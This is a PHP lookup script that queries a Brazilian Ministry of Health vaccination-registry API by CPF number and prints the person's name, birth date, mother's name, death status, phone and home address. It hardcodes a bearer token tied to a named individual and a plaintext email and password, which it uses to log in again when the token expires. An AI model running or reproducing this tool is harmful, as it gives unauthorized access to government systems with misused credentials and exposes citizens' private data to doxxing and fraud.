<?php

error_reporting(0);
function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = $_GET['lista'];

$url = 'https://servicos-cloud.saude.gov.br/pni-bff/v1/cidadao/cpf/' . $lista;

$headers = array(
  'Accept: application/json, text/plain, */*',
  'Referer: https://si-pni.saude.gov.br/',
  'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6I1pXVCJ9.eyJ1c2VyX25hbWUiOiI2MDMyNDEyNzMzMiIsIm9yaWdlbSI6IlNDUEEiLCJpc3MiOiJzYXVkZS5nb3YuYnIiLCJub21lIjoiVklUT1JJTk8gRkVSUkVJUkEgREEgU0lMVkEgTkVUTyIsImF1dGhvcml0aWVzIjpbIlJPTEVfU0ktUE5JX09FU0MiLCJST0xFX1NDUEFTSVNURU1BX0dFUyIsIlJPTEVfU0ktUE5JIiwiUk9MRV9ER01QIiwiUk9MRV9ER01QX1RFQy5NVU4iLCJST0xFX1NDUEFfVVNSIiwiUk9MRV9TQ1BBU0lTVEVNQSIsIlJPTEVfU0ktUE5JX0dFU0EiLCJST0xFX1NDUEEiLCJST0xFX1NJLVBOSV9PRVMiXSwiY2xpZW50X2lkIjoiU0ktUE5JIiwic2NvcGUiOlsiQ05TRElHSVRBTCIsIkdPVkJSIiwiU0NQQSJdLCJjbmVzIjoiNzA4NDAwMjY3NDk0MzY2Iiwib3JnYW5pemF0aW9uIjoiREFUQVNVUyIsImNwZiI6IjYwMzI0MTI3MzMyIiwiZXhwIjoxNjk0NDQ3MDI5LCJqdGkiOiI0OTRmNjg2OC03OTA2LTQwNTctYWU2NC0xMDczZDA4NGY4ODciLCJrZXkiOiIzOTQ2MzQiLCJlbWFpbCI6InZpdG9yaW5vZmVycmVpcmE5NkBnbWFpbC5jb20ifQ._YEGjjO7ezGPnnnvZS_nwCCng5eJFB-Xvdg4jp7XRSM',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76',
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$consultacpf = curl_exec($ch);

if (stripos($consultacpf, 'Token do usuário do SCPA inválido/expirado.')) {

    $login = base64_encode('semus.guimaraes2017@gmail.com:sipni123'); /* Troque o login caso mudem a senha */

    $url = 'https://servicos-cloud.saude.gov.br/pni-bff/v1/autenticacao/tokenAcesso';

    $headers = array(
        'accept: application/json',
        'Referer: https://si-pni.saude.gov.br/',
        'X-Authorization: Basic ' . $login,
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76',
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $consultacpf = curl_exec($ch);

    if (stripos($consultacpf, 'Usuário e senha SCPA não autorizados.')) {
        echo '<font color = "red"> $ Error </font> => [Usuário e senha SCPA não autorizados.] => [Lean7]';
        return;
    } else {

        $token_acesso = getStr($consultacpf, '"accessToken":"', '",');

        $url = 'https://servicos-cloud.saude.gov.br/pni-bff/v1/cidadao/cpf/' . $lista;

        $headers = array(
            'Accept: application/json, text/plain, */*',
            'Referer: https://si-pni.saude.gov.br/',
            'Authorization: Bearer ' . $token_acesso,
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76',
        );

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $consultacpf = curl_exec($ch);

        $nome = getStr($consultacpf, '"nome":"', '",');
        $cns = getStr($consultacpf, '"cnsDefinitivo":"', '",');
        $datanasc = getStr($consultacpf, '"dataNascimento":"', '",');
        $sexo = getStr($consultacpf, '"sexo":"', '",');
        $sexo = ($sexo == 'F') ? 'Feminino' : 'Masculino';
        $nomeMae = getStr($consultacpf, '"nomeMae":"', '",');
        $obito = getStr($consultacpf, '"obito":', ',');
        $obito = ($obito == 'false') ? 'Nao' : 'Sim';
        $pais = getStr($consultacpf, '"ddi":"', '",');
        $ddd = getStr($consultacpf, '"ddd":"', '",');
        $numero = getStr($consultacpf, '"numero":"', '",');
        $teste1 = getStr($consultacpf, '"endereco":{', '}}]}');
        $endreco = getStr($teste1, '"logradouro":"', '",');
        $numerocasa = getStr($teste1, '"numero":"', '",');
        $bairro = getStr($teste1, '"bairro":"', '",');
        $estado = getStr($teste1, '"siglaUf":"', '",');
        $cep = getStr($teste1, '"cep":"', '"');

        echo '<b>🔎 Consulta De CPF Completa 🔎</b><br>• CPF: ' . $cpf . '<br>• NOME: ' . $nome . '<br>• DATA NASCIMENTO: ' . $datanasc . '<br>• Sexo: ' . $sexo . '<br>• NOME MAE: ' . $nomeMae . '<br>• OBITO: ' . $obito . '<br>• Telefones: <b>(' . $ddd . ') ' . $numero . '</b><br>• Endereço:<br>• Rua: ' . $endreco . '<br>• Numero: ' . $numerocasa . '<br>• Bairro: ' . $bairro . '<br>• Estado: ' . $estado . '<br>• Cep: ' . $cep . '<br><br> $$ Github: @consultacpf $$';
    }
}



?>